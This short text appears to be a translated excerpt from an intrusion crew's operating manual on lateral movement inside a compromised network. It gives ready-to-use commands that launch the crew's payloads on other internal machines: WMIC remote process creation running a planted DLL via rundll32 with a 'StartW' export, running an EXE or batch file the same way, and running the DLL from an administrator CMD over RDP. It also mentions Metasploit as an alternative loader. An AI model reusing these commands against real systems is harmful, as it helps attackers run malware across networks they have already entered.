We use it more often when launching VMIKOM
1) if it is DLL, then
shell wmic /node:192.168.104.13 process call create "rundll32.exe C:\ProgramData\x64.dll StartW"

Accordingly, where is the ip, we insert the ip of the machine to which we have access, then the path and the name of our dll goes, I think the syntax is clear

If you are on the RDP> open CMD from the administrator and rundll32.exe C:\ProgramData\x64.dll, StartW you can specify any path according to where your dll is located


For EXE or .bat format, launch VMIKOM like this

shell wmic /node:10.28.0.3 process call create "C:\ProgramData\j1.exe"



You can also download and run through the metasploit, but now we rarely use launch and load using this tool, since it does not work correctly in the latest version
